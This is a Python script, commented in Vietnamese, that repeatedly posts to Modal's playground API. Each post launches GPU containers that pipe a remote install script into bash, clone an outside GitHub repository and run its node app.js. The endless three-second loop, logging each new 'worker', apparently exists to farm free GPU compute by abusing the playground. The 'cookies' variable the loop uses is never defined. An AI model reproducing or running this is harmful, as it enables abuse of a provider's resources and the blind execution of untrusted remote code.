import requests
import time
headers = {
    'sec-ch-ua-platform': '"Windows"',
    'Referer': '',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'baggage': 'sentry-environment=production,sentry-release=1543c249318246a694140eff3b21f2f3,sentry-public_key=d75f7cb747cd4fe8ac03973ae3d39fec,sentry-trace_id=1272401bb0804138b0fca32743af0156',
    'sentry-trace': '1272401bb0804138b0fca32743af0156-be02d70ca1e06590',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'content-type': 'application/json',
}

json_data = {
    'tutorial': 'get_started',
    'code': 'import modal\n\n# Tạo image có CUDA, Python, git, curl, Node.js LTS 18\nimage = (\n    modal.Image.from_registry("nvidia/cuda:12.4.0-devel-ubuntu22.04", add_python="3.11")\n    .apt_install("git", "curl", "gnupg")\n    .run_commands(\n        "curl -fsSL https://deb.nodesource.com/setup_18.x | bash -",\n        "apt-get install -y nodejs"\n    )\n    .pip_install("cupy-cuda12x")\n)\n\napp = modal.App("node-runner")\n\n@app.function(image=image, gpu="A10G")\ndef run_node():\n    import subprocess\n\n    # Clone repo (chỉ clone nếu chưa có)\n    subprocess.run(["git", "clone", "--depth=1", "https://github.com/haiduytruong50-dotcom/tool.git"], check=False)\n\n    # Chạy node app.js trong thư mục tool\n    process = subprocess.Popen(["node", "app.js"], cwd="tool")\n    process.wait()',
    'modalEnvironment': 'main',
    'winsize': {
        'rows': 16,
        'cols': 93,
    },
}

response = requests.post('https://modal.com/api/playground/haiduytruong50-dotcom/run', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"tutorial":"get_started","code":"import modal\\n\\n# Tạo image có CUDA, Python, git, curl, Node.js LTS 18\\nimage = (\\n    modal.Image.from_registry(\\"nvidia/cuda:12.4.0-devel-ubuntu22.04\\", add_python=\\"3.11\\")\\n    .apt_install(\\"git\\", \\"curl\\", \\"gnupg\\")\\n    .run_commands(\\n        \\"curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\\",\\n        \\"apt-get install -y nodejs\\"\\n    )\\n    .pip_install(\\"cupy-cuda12x\\")\\n)\\n\\napp = modal.App(\\"node-runner\\")\\n\\n@app.function(image=image, gpu=\\"A10G\\")\\ndef run_node():\\n    import subprocess\\n\\n    # Clone repo (chỉ clone nếu chưa có)\\n    subprocess.run([\\"git\\", \\"clone\\", \\"--depth=1\\", \\"https://github.com/haiduytruong50-dotcom/tool.git\\"], check=False)\\n\\n    # Chạy node app.js trong thư mục tool\\n    process = subprocess.Popen([\\"node\\", \\"app.js\\"], cwd=\\"tool\\")\\n    process.wait()","modalEnvironment":"main","winsize":{"rows":16,"cols":93}}'.encode()
#response = requests.post('https://modal.com/api/playground/haiduytruong50-dotcom/run', headers=headers, data=data)

url = 'https://modal.com/api/playground/vudeptrai7904/run'
delay = 3  

def main():
    while True:
        try:
            resp = requests.post(
                url,
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=10  
            )
            print(f"Đã tạo worker thành công | Status: {resp.status_code}")
        except requests.exceptions.Timeout:
            print("Request bị timeout, thử lại sau...")
        except Exception as e:
            print(f"Tạo worker với lỗi: {e}")

        for i in range(delay, 0, -1):
            print(f"Đợi {i} giây...", end="\r", flush=True)
            time.sleep(1)


if __name__ == "__main__":
    main()






